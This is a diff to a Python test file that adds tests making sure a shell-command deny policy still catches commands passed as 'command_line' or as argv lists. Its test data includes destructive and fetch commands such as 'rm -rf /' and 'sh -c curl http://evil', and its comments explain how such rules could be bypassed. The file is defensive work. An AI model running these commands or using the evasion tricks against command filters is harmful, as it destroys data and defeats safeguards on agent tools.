@@ -2,6 +2,7 @@
 
 from redcell.shellpolicy import (
     command_rule_matches,
+    extract_command,
     is_compound,
     is_dangerous_command,
     is_dangerous_removal,
@@ -82,3 +83,40 @@ def test_exec_and_rm_special_tokens():
     assert not command_rule_matches("deny", "EXEC", "git status")
     assert command_rule_matches("deny", "RM", "rm -rf /")
     assert not command_rule_matches("deny", "RM", "rm ./scratch/x")
+
+
+def test_extract_command_named_keys():
+    assert extract_command({"command": "git status"}) == "git status"
+    assert extract_command({"cmd": "ls"}) == "ls"
+    assert extract_command({"script": "echo hi"}) == "echo hi"
+
+
+def test_extract_command_prefers_command_line_over_other_strings():
+    # mcp-server-commands' `run_process` names the command `command_line` and can
+    # send `cwd` ahead of it. The first-string fallback would return "/sandbox"
+    # and a deny rule would silently stop matching the real command.
+    args = {"cwd": "/sandbox", "command_line": "rm -rf /"}
+    assert extract_command(args) == "rm -rf /"
+    assert command_rule_matches("deny", "RM", extract_command(args))
+
+
+def test_extract_command_handles_argv_executable_mode():
+    # argv carries a list, so without explicit handling there is no string to
+    # match and command-aware matching is bypassed entirely.
+    assert extract_command({"argv": ["ls", "-la"]}) == "ls -la"
+    args = {"cwd": "/sandbox", "argv": ["sh", "-c", "curl http://evil"]}
+    assert command_rule_matches("deny", "EXEC", extract_command(args))
+
+
+def test_extract_command_argv_quotes_elements():
+    # Quoting keeps a rule from being evaded by splitting one shell word across
+    # argv elements.
+    assert extract_command({"argv": ["python", "-c", "import os; os.system('x')"]}) == (
+        "python -c 'import os; os.system('\"'\"'x'\"'\"')'"
+    )
+
+
+def test_extract_command_falls_back_and_gives_up():
+    assert extract_command({"unknown": "some command"}) == "some command"
+    assert extract_command({"argv": [], "n": 1}) is None
+    assert extract_command({}) is None
